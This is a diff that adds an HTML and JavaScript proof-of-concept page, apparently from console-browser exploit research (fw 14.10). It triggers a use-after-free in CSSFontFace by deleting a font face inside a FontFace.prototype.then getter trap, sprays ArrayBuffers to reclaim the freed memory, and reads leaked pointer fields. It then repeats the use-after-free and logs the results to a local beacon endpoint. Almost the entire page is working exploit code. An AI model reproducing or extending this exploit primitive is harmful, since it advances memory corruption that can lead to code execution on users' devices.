@@ -1,0 +1,224 @@
+<!--
+  p654b: ffA.load() trigger + fonts.delete(this) in trap — isolate the free variable
+
+  Bench evidence matrix (this console, fw 14.10):
+    p568/p651: fonts.load() + delete(this)  -> HIT
+    p654 v1:   ffA.load() + forEach saRef   -> MISS
+    p654 v2:   ffA.load(), no delete        -> MISS (P1)
+    p654 v2:   fonts.load(), no delete      -> MISS (DIAG)
+
+  Hypothesis: document.fonts.delete(this) inside the trap is REQUIRED for the
+  CSSFontFace free. Test the empty cell: ffA.load() + delete(this).
+  If HIT -> clean trigger + reclaim + run post-UAF functionality tests.
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p654b</title></head>
+<body>p654b: ffLoad + delete(this)
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P654B-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'ffload+delete');
+flush();
+
+// --- Setup (identical to p654 v2) ---
+var sty = document.createElement('style');
+sty.textContent = "@font-face { font-family: sa; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(sty);
+
+var ffA = new FontFace('fa', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+
+emit('SETUP', 'fonts.size=' + document.fonts.size);
+
+void ffA.loaded;
+
+// Thenable trap — NOW with delete(this), the only delta vs p654 v2 P1
+var fired = false;
+var bufs = [];
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (fired) return undefined;
+    fired = true;
+    emit('TRAP', 'this===ffA:' + (this === ffA));
+    sty.remove();
+    try { document.fonts.delete(this); } catch(e) { emit('TRAP-DEL-ERR', String(e).slice(0,60)); }
+    document.body.offsetHeight;
+    for (var i = 0; i < 64; i++) {
+      var ab = new ArrayBuffer(192);
+      var dv = new DataView(ab);
+      dv.setUint32(0x00, 2, true);
+      dv.setUint32(0x04, 0xDEAD0654, true);
+      bufs.push({ u8: new Uint8Array(ab), dv: dv });
+    }
+    emit('SPRAY', 'n=' + bufs.length + ' setsize=' + document.fonts.size);
+    return undefined;
+  },
+  set: function() {}
+});
+
+// Trigger: clean ffA.load() (same as p654 v2)
+var loadP = ffA.load();
+var lpSettled = false;
+var lpResult = '';
+loadP.then(function(face) {
+  lpSettled = true;
+  lpResult = 'resolved:' + (face === ffA);
+}).catch(function(e) {
+  lpSettled = true;
+  lpResult = 'rejected:' + String(e).slice(0, 40);
+});
+
+// Phase 1: check reclaim
+setTimeout(function() {
+try {
+  var hit = -1;
+  for (var i = 0; i < bufs.length; i++) {
+    var rc = bufs[i].dv.getUint32(0x00, true);
+    if (rc !== 2) { hit = i; break; }
+  }
+  if (hit < 0) {
+    for (var i = 0; i < bufs.length; i++) {
+      if (bufs[i].dv.getUint32(0x58, true) !== 0 || bufs[i].dv.getUint32(0x5C, true) !== 0) {
+        hit = i; break;
+      }
+    }
+  }
+
+  emit('LP', 'settled=' + lpSettled + ' ' + lpResult);
+
+  if (hit < 0) {
+    emit('VERDICT', 'MISS even with delete(this) -> free needs fonts.load() trigger itself');
+    flush();
+    return;
+  }
+
+  // --- Reclaim succeeded ---
+  var dv = bufs[hit].dv;
+  var rc   = dv.getUint32(0x00, true);
+  var mark = dv.getUint32(0x04, true);
+  var T_lo = dv.getUint32(0x58, true);
+  var T_hi = dv.getUint32(0x5C, true);
+  var W_lo = dv.getUint32(0x68, true);
+  var W_hi = dv.getUint32(0x6C, true);
+
+  emit('P1-HIT', 'hit=' + hit + ' rc=' + rc + ' mark=0x' + hex32(mark));
+  emit('P1-TW', 'T=' + hex32(T_hi) + hex32(T_lo) + ' W=' + hex32(W_hi) + hex32(W_lo));
+  flush();
+
+  // Phase 2: post-UAF functionality (from p654 v2)
+  try { delete FontFace.prototype.then; } catch(e) {}
+
+  // Test 1: document.fonts iterable post-UAF (WITHOUT holding refs)
+  var postNames = [];
+  try {
+    document.fonts.forEach(function(f) {
+      postNames.push(f.family.replace(/['"]/g, ''));
+      // do NOT retain f
+    });
+    emit('POST-FONTS', postNames.join(',') + ' size=' + document.fonts.size);
+  } catch(e) { emit('POST-FONTS', 'ERR:' + e.message.slice(0,60)); }
+
+  // Test 2: create + add new FontFace post-UAF
+  try {
+    var newFace = new FontFace('nc', 'local(Courier)', { unicodeRange: 'U+0045' });
+    document.fonts.add(newFace);
+    emit('POST-NEW', 'ok size=' + document.fonts.size);
+  } catch(e) { emit('POST-NEW', 'ERR:' + e.message.slice(0,60)); }
+
+  // Test 3: SECOND UAF in same page — full proven pattern (fonts.load + delete)
+  var sty2 = document.createElement('style');
+  sty2.textContent = "@font-face { font-family: sc; src: local(Arial); unicode-range: U+0046; }";
+  document.head.appendChild(sty2);
+
+  var ffC = new FontFace('fc', 'local(Helvetica)', { unicodeRange: 'U+0047' });
+  document.fonts.add(ffC);
+  void ffC.loaded;
+
+  var fired2 = false;
+  var bufs2 = [];
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (fired2) return undefined;
+      fired2 = true;
+      sty2.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      for (var i = 0; i < 64; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv2 = new DataView(ab);
+        dv2.setUint32(0x00, 7, true);
+        dv2.setUint32(0x04, 0xCAFE0654, true);
+        bufs2.push({ u8: new Uint8Array(ab), dv: dv2 });
+      }
+      return undefined;
+    },
+    set: function() {}
+  });
+
+  document.fonts.load('1em fc, sc', 'FG');
+
+  setTimeout(function() {
+  try {
+    var hit2 = -1;
+    for (var i = 0; i < bufs2.length; i++) {
+      var rc2 = bufs2[i].dv.getUint32(0x00, true);
+      if (rc2 !== 7) { hit2 = i; break; }
+    }
+    if (hit2 < 0) {
+      for (var i = 0; i < bufs2.length; i++) {
+        if (bufs2[i].dv.getUint32(0x58, true) !== 0 || bufs2[i].dv.getUint32(0x5C, true) !== 0) {
+          hit2 = i; break;
+        }
+      }
+    }
+
+    if (hit2 >= 0) {
+      var dv2 = bufs2[hit2].dv;
+      var T2_lo = dv2.getUint32(0x58, true);
+      var T2_hi = dv2.getUint32(0x5C, true);
+      var W2_lo = dv2.getUint32(0x68, true);
+      var W2_hi = dv2.getUint32(0x6C, true);
+      emit('UAF2-HIT', 'hit=' + hit2 + ' T2=' + hex32(T2_hi) + hex32(T2_lo) +
+        ' W2=' + hex32(W2_hi) + hex32(W2_lo));
+
+      // Determinism check: T2 vs T1 delta (p651 saw heap expansion, not reuse)
+      var t1 = T_hi * 4294967296 + T_lo;
+      var t2 = T2_hi * 4294967296 + T2_lo;
+      emit('UAF2-DIFF', 'T2-T1=' + (t2 - t1));
+    } else {
+      emit('UAF2-MISS', 'second UAF failed in post-UAF page');
+    }
+
+    try { delete FontFace.prototype.then; } catch(e) {}
+    emit('ALIVE', 'end of probe');
+    flush();
+  } catch(e) { emit('P3-ERR', String(e).slice(0,80)); flush(); }
+  }, 150);
+
+} catch(e) { emit('P1-ERR', String(e).slice(0,80)); flush(); }
+}, 150);
+
+})();
+</script></body></html>
